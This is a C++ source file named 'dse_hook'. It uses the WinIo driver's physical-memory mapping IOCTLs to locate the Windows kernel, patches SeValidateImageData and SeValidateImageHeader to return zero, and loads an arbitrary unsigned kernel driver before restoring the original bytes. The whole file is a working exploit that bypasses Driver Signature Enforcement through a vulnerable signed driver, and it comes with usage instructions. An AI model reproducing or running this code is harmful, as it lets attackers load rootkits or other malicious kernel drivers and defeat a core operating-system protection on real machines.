#pragma warning(disable: 4996)
#include <Windows.h>
#include <iostream>
#include <map>

typedef unsigned long u32;
typedef unsigned long long u64;

u64 driver_handle;
#define IOCTL_MAP 0x80102040
#define IOCTL_UNMAP 0x80102044

#define PATTERN_SEARCH_RANGE 0xBFFFFF
#define DRIVER_NAME_LEN 16

char se_validate_image_data_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };
char se_validate_image_header_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };

unsigned char se_validate_image_data_pattern[17] = { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0 };
unsigned char se_validate_image_header_pattern[21] = { 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33, 0xF6 };

char patch[6] = {
	0xB8, 0x00, 0x00, 0x00, 0x00,	// mov rax, 0
	0xC3							// ret
};

struct winio_packet
{
	u64 size;
	u64 phys_address;
	u64 phys_handle;
	u64 phys_linear;
	u64 phys_section;
};

u64 phys_map(winio_packet& packet)
{
	u32 bytes_returned;
	if (!DeviceIoControl((void*)driver_handle, IOCTL_MAP, &packet, sizeof(winio_packet), &packet, sizeof(winio_packet), &bytes_returned, NULL))
		return NULL;

	return packet.phys_linear;
}

bool phys_unmap(winio_packet& packet)
{
	u32 bytes_returned;
	if (!DeviceIoControl((void*)driver_handle, IOCTL_UNMAP, &packet, sizeof(winio_packet), NULL, 0, &bytes_returned, NULL))
		return false;

	return true;
}

bool read_phys(u64 addr, u64 buf, u64 size)
{
	winio_packet packet;
	packet.phys_address = addr;
	packet.size = size;

	u64 linear_address = phys_map(packet);
	if (linear_address == NULL)
		return false;

	printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
	memcpy((void*)buf, (void*)linear_address, size);

	phys_unmap(packet);
	return true;
}


bool write_phys(u64 addr, u64 buf, u64 size)
{
	winio_packet packet;
	packet.phys_address = addr;
	packet.size = size;

	u64 linear_address = phys_map(packet);
	if (linear_address == NULL)
		return false;

	printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
	memcpy((void*)linear_address, (void*)buf, size);

	phys_unmap(packet);
	return true;
}

u64 find_pattern(u64 start, u64 range, unsigned char* pattern, size_t pattern_length)
{
	u64 buf = (u64)malloc(range);
	read_phys(start, (u64)buf, range);

	u64 result = 0;
	for (int i = 0; i < range; i++)
	{
		bool vtn = true;
		for (int j = 0; j < pattern_length; j++)
		{
			if (vtn && pattern[j] != 0x00 && *(unsigned char*)(buf + i + j) != pattern[j])
			{
				vtn = false;
			}
		}

		if (vtn)
		{
			result = start + i;
			goto ret;
		}
	}

	ret:
	free((void*)buf);
	return result;
}

//thx gpt4
void rands(char* str, int size) {
	const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
	if (size) {
		--size;
		for (int n = 0; n < size; n++) {
			int key = rand() % (int)(sizeof(charset) - 1);
			str[n] = charset[key];
		}
		str[size] = '\0';
	}
}

int main(int argc, char* argv[])
{
	printf("[*] dse_hook by emlinhax\n");

	if (argc != 3)
	{
		printf("[!] usage: dse_hook.exe your_driver_name c:\\your_driver.sys\n");
		Sleep(1000);
		return -1;
	}

	printf("[*] opening handle to driver...\n");
	driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	printf("[*] driver_handle: %p\n", driver_handle);
	if (driver_handle == -1)
		return -2;

	printf("[*] finding ntoskrnl...\n");
	u64 ntos_base_pa = 0;
	for (int i = 0x00000000; i < 0x20000000; i += 0x01000000)
	{
		char* buf = (char*)malloc(2);
		read_phys(i, (u64)buf, 2);

		if (buf[0] == 'M' && buf[1] == 'Z')
		{
			ntos_base_pa = i;
			printf("[*] ntoskrnl @ 0x%p\n", ntos_base_pa);
			break;
		}
	}

	if (!ntos_base_pa)
	{
		printf("[!] could not find ntoskrnl base.");
		Sleep(2000);
		return -3;
	}

	// find target physical addresses for patch
	u64 se_validate_image_data_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_data_pattern, sizeof(se_validate_image_data_pattern));
	u64 se_validate_image_header_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_header_pattern, sizeof(se_validate_image_header_pattern));
	if (se_validate_image_data_pa == 0 || se_validate_image_header_pa == 0)
	{
		printf("[!] could not find one or both patterns.");
		Sleep(2000);
		return -4;
	}

	// save original bytes
	read_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
	read_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));

	// patch both functions to return zero
	write_phys(se_validate_image_data_pa, (u64)&patch, sizeof(patch));
	write_phys(se_validate_image_header_pa, (u64)&patch, sizeof(patch));

	// start the target driver
	u64 cmdline_create_buf = (u64)malloc(strlen(argv[2]) + 53);
	u64 cmdline_start__buf = (u64)malloc(30);
	sprintf((char*)cmdline_create_buf, "sc create %s binpath=\"%s\" type=kernel>NUL", argv[1], argv[2]);
	sprintf((char*)cmdline_start__buf, "sc start %s>NUL", argv[1]);
	system((char*)cmdline_create_buf);
	system((char*)cmdline_start__buf);

	// unpatch both functions
	write_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
	write_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));

	printf("[*] done!\n");
	Sleep(2000);

	return 0;
}